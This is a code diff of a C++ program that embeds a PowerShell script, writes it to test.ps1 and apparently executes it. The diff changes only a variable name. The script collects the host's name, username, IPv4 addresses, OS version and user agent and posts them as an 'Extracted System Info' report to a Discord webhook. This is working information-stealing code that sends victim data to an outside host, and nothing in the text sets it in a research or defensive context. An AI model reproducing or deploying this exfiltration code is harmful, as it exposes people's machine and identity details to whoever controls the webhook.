@@ -6,7 +6,7 @@
 
 int main() {
     const std::string psScript =
-        "$webhookURL = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"   // make sure to replace with your own webhook url
+        "$url = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"   // make sure to replace with your own webhook url
         "$hostname = $env:COMPUTERNAME;\n"
         "$username = $env:USERNAME;\n"
         "$ipv4 = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike \"*Loopback*\" }).IPAddress;\n"
@@ -15,7 +15,7 @@ int main() {
         "$payload = @{ content = \"**System Information Report**\"; embeds = @(@{ title = \"Extracted System Info\"; color = 16711680; fields = @(@{ name = \"Hostname\"; value = $hostname; inline = $true }, @{ name = \"Username\"; value = $username; inline = $true }, @{ name = \"IPv4 Address\"; value = ($ipv4 -join \", \"); inline = $true }, @{ name = \"OS Version\"; value = $os; inline = $true }, @{ name = \"User-Agent\"; value = $userAgent; inline = $false }) }) };\n"
         "$payload = $payload | ConvertTo-Json -Depth 10 -Compress;\n"
         "Write-Output $payload;\n"
-        "Invoke-RestMethod -Uri $webhookURL -Method Post -Body $payload -ContentType \"application/json\";";
+        "Invoke-RestMethod -Uri $url -Method Post -Body $payload -ContentType \"application/json\";";
 
     std::ofstream psFile("test.ps1");
     if (!psFile.is_open()) {
